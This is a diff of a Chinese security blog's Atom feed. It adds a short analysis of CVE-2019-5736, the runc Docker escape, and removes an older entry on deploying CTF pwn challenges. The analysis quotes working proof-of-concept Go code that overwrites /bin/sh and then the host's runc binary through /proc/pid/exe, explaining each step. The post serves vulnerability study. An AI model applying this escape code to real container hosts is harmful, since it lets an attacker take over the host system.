@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.giantbranch.cn/"/>
-  <updated>2019-05-24T15:07:13.288Z</updated>
+  <updated>2019-06-19T15:44:23.913Z</updated>
   <id>https://www.giantbranch.cn/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2019-5736 docker escape 简要分析</title>
+    <link href="https://www.giantbranch.cn/2019/06/18/CVE-2019-5736%20docker%20escape%20%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"/>
+    <id>https://www.giantbranch.cn/2019/06/18/CVE-2019-5736 docker escape 简要分析/</id>
+    <published>2019-06-18T16:00:00.000Z</published>
+    <updated>2019-06-19T15:44:23.913Z</updated>
+    
+    <content type="html"><![CDATA[<p>闲来没事，简单分析分析，理解理解</p><h1 id="分析exp"><a href="#分析exp" class="headerlink" title="分析exp"></a>分析exp</h1><p>首先这个跟runc有关</p><p>RunC 是一个轻量级的工具，它是用来运行容器的，只用来做这一件事，并且这一件事要做好。我们可以认为它就是个命令行小工具，可以不用通过 docker 引擎，直接运行容器。</p><p>exp：<br><a href="https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go" target="_blank" rel="noopener">https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go</a></p><p>步骤1：首先替换了<code>/bin/sh</code>为<code>#!/proc/self/exe</code>，这样的话，当某个程序调用/bin/sh的时候，就会调用自身</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span><br><span class="line">fd, err := os.Create(&quot;/bin/sh&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)</span><br><span class="line">err = fd.Close()</span><br><span class="line">if err != nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(&quot;[+] Overwritten /bin/sh successfully&quot;)</span><br></pre></td></tr></table></figure><p>我们可以用ll看看，是不是指向ls</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@b7652e3a006b:~# ll /proc/self/exe</span><br><span class="line">lrwxrwxrwx 1 root root 0 Jun 19 15:30 /proc/self/exe -&gt; /bin/ls*</span><br></pre></td></tr></table></figure><p>步骤2：寻找runc的pid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// Loop through all processes to find one whose cmdline includes runcinit</span><br><span class="line">// This will be the process created by runc</span><br><span class="line">var found int</span><br><span class="line">for found == 0 &#123;</span><br><span class="line">pids, err := ioutil.ReadDir(&quot;/proc&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">for _, f := range pids &#123;</span><br><span class="line">fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;)</span><br><span class="line">fstring := string(fbytes)</span><br><span class="line">if strings.Contains(fstring, &quot;runc&quot;) &#123;</span><br><span class="line">fmt.Println(&quot;[+] Found the PID:&quot;, f.Name())</span><br><span class="line">found, err = strconv.Atoi(f.Name())</span><br><span class="line">if err != nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>步骤3：往找到的runc的文件句柄写我们要执行的命令什么的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// We will use the pid to get a file handle for runc on the host.</span><br><span class="line">var handleFd = -1</span><br><span class="line">for handleFd == -1 &#123;</span><br><span class="line">// Note, you do not need to use the O_PATH flag for the exploit to work.</span><br><span class="line">handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777)</span><br><span class="line">if int(handle.Fd()) &gt; 0 &#123;</span><br><span class="line">handleFd = int(handle.Fd())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(&quot;[+] Successfully got the file handle&quot;)</span><br><span class="line"></span><br><span class="line">// Now that we have the file handle, lets write to the runc binary and overwrite it</span><br><span class="line">// It will maintain it&apos;s executable flag</span><br><span class="line">for &#123;</span><br><span class="line">writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)</span><br><span class="line">if int(writeHandle.Fd()) &gt; 0 &#123;</span><br><span class="line">fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle)</span><br><span class="line">writeHandle.Write([]byte(payload))</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找pid的目的是找到runc的路径，比如下面可以通过 /proc/pid/exe获得/bin/bash的软连接，只不过上面是获取runc的软连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@b7652e3a006b:~# ps -aux | grep bash</span><br><span class="line">root          1  0.0  0.1  18508  3160 pts/0    Ss+  15:11   0:00 /bin/bash</span><br><span class="line">root         10  0.0  0.1  18824  3836 pts/1    Ss   15:18   0:00 /bin/bash</span><br><span class="line">root         46  0.0  0.0  11464  1040 pts/1    S+   15:33   0:00 grep --color=auto bash</span><br><span class="line">root@b7652e3a006b:~# ll /proc/10/exe </span><br><span class="line">lrwxrwxrwx 1 root root 0 Jun 19 15:18 /proc/10/exe -&gt; /bin/bash*</span><br></pre></td></tr></table></figure><p>步骤4：<strong>当用户调用docker exec的时候，相当于runc 调用/bin/sh,而/bin/sh被我们改为#!/proc/self/exe，即runc运行自身，而runc自身也被我们修改了，所以相当于runc执行了我们的代码</strong></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://thinkycx.me/posts/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html" target="_blank" rel="noopener">https://thinkycx.me/posts/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html</a><br><a href="https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go" target="_blank" rel="noopener">https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;闲来没事，简单分析分析，理解理解&lt;/p&gt;
+&lt;h1 id=&quot;分析exp&quot;&gt;&lt;a href=&quot;#分析exp&quot; class=&quot;headerlink&quot; title=&quot;分析exp&quot;&gt;&lt;/a&gt;分析exp&lt;/h1&gt;&lt;p&gt;首先这个跟runc有关&lt;/p&gt;
+&lt;p&gt;RunC 是一个轻量级的工具，
+      
+    
+    </summary>
+    
+    
+      <category term="docker安全" scheme="https://www.giantbranch.cn/tags/docker%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="docker escape" scheme="https://www.giantbranch.cn/tags/docker-escape/"/>
+    
+  </entry>
   
   <entry>
     <title>yara的安装与使用</title>
@@ -495,32 +522,6 @@
       
         &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一开始接触pwn的时候，我们要么本地调试，要么自己用socat将程序启动起来远程调试&lt;/p&gt;
 &lt;p&gt;最近去搞pwn培训，发现将pwn题一个一
-      
-    
-    </summary>
-    
-    
-      <category term="pwn" scheme="https://www.giantbranch.cn/tags/pwn/"/>
-    
-      <category term="部署" scheme="https://www.giantbranch.cn/tags/%E9%83%A8%E7%BD%B2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ctf pwn题目的部署</title>
-    <link href="https://www.giantbranch.cn/2018/09/16/ctf%20pwn%E9%A2%98%E7%9B%AE%E7%9A%84%E9%83%A8%E7%BD%B2/"/>
-    <id>https://www.giantbranch.cn/2018/09/16/ctf pwn题目的部署/</id>
-    <published>2018-09-16T16:00:00.000Z</published>
-    <updated>2019-05-24T15:07:13.288Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="使用socat部署"><a href="#使用socat部署" class="headerlink" title="使用socat部署"></a>使用socat部署</h1><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt install socat</div></pre></td></tr></table></figure><p>模板：<code>socat tcp-listen:port,fork exec:./程序名,reuseaddr</code></p><p>实例：<code>socat tcp-listen:10001,fork exec:./pwn1,reuseaddr</code></p><p>缺点：需要控制好权限；存在各种风险</p><h1 id="使用pwn-deploy部署"><a href="#使用pwn-deploy部署" class="headerlink" title="使用pwn_deploy部署"></a>使用pwn_deploy部署</h1><p><a href="https://github.com/giantbranch/pwn_deploy" target="_blank" rel="external">https://github.com/giantbranch/pwn_deploy</a></p><p>项目基于docker和xinetd<br>项目主要根据bin目录的文件，动态生成flag，xinetd配置文件，Dockerfile和docker-compose.yml<br>程序都是放在家目录，通过权限控制不能进入别人的家目录，同时不能修改或删除二进制程序和flag文件</p><p><strong>使用</strong></p><blockquote><ol><li>将所有pwn题目放入bin目录（注意文件名不要带特殊字符） </li><li>python initialize.py </li><li>docker-compose up –build -d</li></ol></blockquote><p>这个部署方式并不太安全，只是基于权限控制</p><p>请使用： <a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="external">https://github.com/giantbranch/pwn_deploy_chroot</a></p><h1 id="使用pwn-deploy-chroot部署"><a href="#使用pwn-deploy-chroot部署" class="headerlink" title="使用pwn_deploy_chroot部署"></a>使用pwn_deploy_chroot部署</h1><p><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="external">https://github.com/giantbranch/pwn_deploy_chroot</a></p><p>项目基于docker，xinetd和chroot，更加安全</p><p>相对上面的pwn_deploy，使用chroot更加安全</p><p>而且用自己写的catflag程序作为/bin/sh程序，这就将安全性提升一步了</p><p>使用步骤也是3步：</p><blockquote><ol><li>将所有pwn题目放入bin目录（注意文件名不要带特殊字符） </li><li>python initialize.py </li><li>docker-compose up –build -d</li></ol></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;使用socat部署&quot;&gt;&lt;a href=&quot;#使用socat部署&quot; class=&quot;headerlink&quot; title=&quot;使用socat部署&quot;&gt;&lt;/a&gt;使用socat部署&lt;/h1&gt;&lt;p&gt;安装&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;ta
       
     
     </summary>
